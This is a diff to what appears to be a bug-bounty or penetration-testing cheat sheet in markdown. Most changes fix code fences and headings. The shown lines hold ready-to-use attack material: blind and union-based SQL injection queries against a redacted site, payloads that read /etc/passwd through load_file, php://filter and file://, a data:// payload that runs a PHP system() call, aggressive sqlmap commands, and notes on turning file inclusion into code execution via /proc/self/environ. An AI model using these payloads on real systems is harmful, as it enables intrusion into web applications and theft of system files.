@@ -91,8 +91,9 @@ whatweb example.com
 ```
 searchsploit example
 ```
->next
-```nikto -h example.com
+# Nikto
+```
+nikto -h example.com
 ```
 > tool df list
 
@@ -213,6 +214,7 @@ https://redacted.com/projects/projects-edit.html?id=879 AND(ascii(substr((select
 
 TRUE QUERY:
 https://redacted.com/projects/projects-edit.html?id=879 AND(ascii(substr((select database()),1,1)))=121   -- -
+```
 
 >next order by
 ```
@@ -312,6 +314,7 @@ hex(load_file('/etc/passwd'))
 ```
 =1’ /*!50000union*/ select 1,2,3,4,5,’../index’,7,8,’php://filter/convert.base64-encode/resource=.’ -- -
 1' /*!50000union*/ select 1,2,3,4,5,6,7,8,’data://text/plain,<?php echo system(“uname -a”);?>’-- -
+```
 >print system
 ```
 @@ft_boolean_syntax
@@ -352,7 +355,7 @@ sqlmap -u exam.com/?q=1 --crawel 2 --batch
 ```
 sqlmap -r file.txt --risk=3 --level=5 --batch 
 ```
->more sqlmap
+> more sqlmap
 
 [advancesqlmap](https://muhdaffa.medium.com/tips-and-tricks-for-effective-sql-injection-testing-using-sqlmap-tamper-scripts-ed4bfa5717e7?source=rss------bug_bounty-5)
 
@@ -420,6 +423,10 @@ php://filter/convert.base64-encode/resource=dog/../../../etc/passwd
 >tool for php filter and full
 [lfi scan all](https://github.com/Chocapikk/LFIHunt)
 
+
+>payalod lfi
+```
+file:///etc/passwd
 
 ># lfi to rce
 > /proc/self/environ
